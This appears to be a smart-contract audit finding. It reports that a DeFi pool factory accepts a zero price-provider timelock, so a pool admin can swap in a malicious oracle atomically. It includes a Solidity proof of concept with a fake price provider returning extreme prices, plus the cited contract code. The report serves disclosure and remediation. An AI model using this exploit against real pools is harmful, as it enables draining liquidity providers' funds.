### Title
Pool admin bypasses price-provider timelock with `priceProviderTimelock = 0`, enabling atomic oracle swap and bad-price execution — (`metric-core/contracts/MetricOmmPoolFactory.sol`)

---

### Summary

`MetricOmmPoolFactory.createPool` accepts `priceProviderTimelock = 0` without validation. When the timelock is zero, `proposePoolPriceProvider` sets `executeAfter = block.timestamp + 0 = block.timestamp`, and `executePoolPriceProviderUpdate` immediately passes the check `block.timestamp < execAfter` (false). A malicious pool admin can therefore propose and execute a switch to a manipulated price provider atomically in a single transaction, feeding arbitrary bid/ask prices into the pool and draining LP funds.

---

### Finding Description

The protocol added a two-step, timelocked price-provider rotation flow (documented in `AuditFindings.md` as the fix for M01 — "Admin can arbitrarily change the pool priceProvider"). The fix is incomplete: `priceProviderTimelock` is stored verbatim from `PoolParameters` with no lower-bound enforcement.

**Propose path** (`MetricOmmPoolFactory.sol` line 487):
```solidity
uint256 executeAfter = block.timestamp + timelock;   // timelock == 0 → executeAfter == block.timestamp
pendingPriceProvider[pool] = newPriceProvider;
pendingPriceProviderExecuteAfter[pool] = executeAfter;
```

**Execute path** (`MetricOmmPoolFactory.sol` line 499):
```solidity
if (block.timestamp < execAfter) revert PriceProviderTimelockNotElapsed(...);
// block.timestamp < block.timestamp → false → no revert
```

The only validation on the incoming provider is `_validatePriceProvider`, which checks only that `token0()/token1()` match the pool tokens. A malicious contract that returns the correct token addresses but arbitrary bid/ask prices passes this check. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

Pool creation stores the timelock without any minimum check: [5](#0-4) 

The `PoolParameters` struct documents `type(uint256).max` as the immutable sentinel but imposes no lower bound on finite values: [6](#0-5) 

The audit resolution note for M01 confirms the intent was delayed execution, but the implementation leaves the zero case open: [7](#0-6) 

---

### Impact Explanation

A pool admin who created the pool with `priceProviderTimelock = 0` can, after LPs have deposited:

1. Deploy a malicious `IPriceProvider` that returns the correct `token0()/token1()` but returns an extreme bid/ask (e.g., `bid = type(uint128).max - 1`, `ask = type(uint128).max`).
2. Call `proposePoolPriceProvider(pool, maliciousProvider)` — passes `_validatePriceProvider` because tokens match.
3. Call `executePoolPriceProviderUpdate(pool)` in the same transaction — passes because `block.timestamp < block.timestamp` is false.
4. Swap against the pool at the manipulated price, extracting LP token reserves at a fraction of their real value.

This is a direct loss of LP principal via bad-price execution. The pool's swap math trusts `getBidAndAskPrice()` unconditionally once the provider is set. [8](#0-7) 

---

### Likelihood Explanation

Pool creation is permissionless — anyone can call `createPool` and set themselves as `poolAdmin` with `priceProviderTimelock = 0`. The `PoolCreated` event emits the timelock value, but there is no on-chain enforcement preventing LPs from depositing into a zero-timelock pool. The attack requires only that the malicious admin wait for meaningful LP deposits before executing the swap. [9](#0-8) 

---

### Recommendation

**Short term:** Enforce a minimum `priceProviderTimelock` in `_validatePoolParameters` (e.g., `require(params.priceProviderTimelock == type(uint256).max || params.priceProviderTimelock >= MIN_TIMELOCK)`). Expose `MIN_TIMELOCK` as a public constant so LPs can verify it on-chain.

**Long term:** Consider requiring at least one block between propose and execute (i.e., `executeAfter > block.timestamp` at propose time, not `>=`), so even a one-second timelock cannot be collapsed into a single atomic transaction. [10](#0-9) 

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// Malicious provider: correct tokens, extreme prices
contract MaliciousProvider {
    address public immutable token0;
    address public immutable token1;
    constructor(address t0, address t1) { token0 = t0; token1 = t1; }
    // Returns bid ≈ max, ask = max → pool sells token0 for almost nothing
    function getBidAndAskPrice() external pure returns (uint128, uint128) {
        return (type(uint128).max - 1, type(uint128).max);
    }
}

contract PoC {
    function exploit(
        MetricOmmPoolFactory factory,
        address pool,
        address token0,
        address token1
    ) external {
        // Step 1: deploy malicious provider with correct tokens
        MaliciousProvider bad = new MaliciousProvider(token0, token1);

        // Step 2: propose — passes _validatePriceProvider (tokens match)
        factory.proposePoolPriceProvider(pool, address(bad));

        // Step 3: execute immediately — block.timestamp < block.timestamp is false
        factory.executePoolPriceProviderUpdate(pool);

        // Step 4: swap against pool at manipulated price → drain LP reserves
        // IMetricOmmPool(pool).swap(...);
    }
}
```

The precondition is that the pool was created with `priceProviderTimelock = 0` and `msg.sender == poolAdmin[pool]`. Both conditions are freely chosen by the pool creator at deployment. [8](#0-7) [3](#0-2)

  function proposePoolPriceProvider(address pool, address newPriceProvider)
    external
    override
    nonReentrant
    onlyPoolAdmin(pool)
  {
    PoolImmutables memory p = IMetricOmmPool(pool).getImmutables();
    uint256 timelock = priceProviderTimelock[pool];
    if (p.immutablePriceProvider != address(0)) revert PriceProviderImmutable();
    _validatePriceProvider(p.token0, p.token1, newPriceProvider);

    address mutableProvider = PoolStateLibrary._slot3(pool);
    address current = mutableProvider != address(0) ? mutableProvider : p.immutablePriceProvider;
    uint256 executeAfter = block.timestamp + timelock;
    pendingPriceProvider[pool] = newPriceProvider;
    pendingPriceProviderExecuteAfter[pool] = executeAfter;
    emit PoolPriceProviderChangeProposed(pool, current, newPriceProvider, executeAfter);
  }

  /// @inheritdoc IMetricOmmPoolFactoryPoolAdmin
  function executePoolPriceProviderUpdate(address pool) external override nonReentrant onlyPoolAdmin(pool) {
    address pending = pendingPriceProvider[pool];
    if (pending == address(0)) revert NoPriceProviderChangeProposed();
    uint256 execAfter = pendingPriceProviderExecuteAfter[pool];
    // forge-lint: disable-next-line(block-timestamp) -- timelock enforcement legitimately relies on `block.timestamp`.
    if (block.timestamp < execAfter) revert PriceProviderTimelockNotElapsed(execAfter, block.timestamp);
    PoolImmutables memory p = IMetricOmmPool(pool).getImmutables();
    if (p.immutablePriceProvider != address(0)) revert PriceProviderImmutable();
    _validatePriceProvider(p.token0, p.token1, pending);
    IMetricOmmPoolFactoryActions(pool).setPriceProvider(pending);
    delete pendingPriceProvider[pool];
    delete pendingPriceProviderExecuteAfter[pool];
    emit PoolPriceProviderUpdated(pool, pending);
  }

```markdown
## M01 - Admin can arbitrarily change the pool priceProvider

### Finding summary

`setPriceProvider()` allowed admin to replace oracle at runtime, and `priceProvider` was returned by `getImmutables()`.

### Resolution

Fixed.

Changes:

- Added constructor config `priceProviderTimelock`.
- Added admin flow:
  - `proposePriceProvider(address newPriceProvider)`
  - `executePriceProviderUpdate()`
- Added events:
  - `PriceProviderChangeProposed(currentPriceProvider, newPriceProvider, executeAfter)`
  - `PriceProviderUpdated(newPriceProvider)`

Behavior now:

- `priceProviderTimelock == type(uint256).max` => immutable mode (admin updates disabled).
- `priceProviderTimelock < type(uint256).max` => mutable mode with delayed execution.
- Price provider used by swaps/reports resolves through timelock mode; active provider is read via `MetricOmmPoolStateView.priceProvider(pool)`.
```
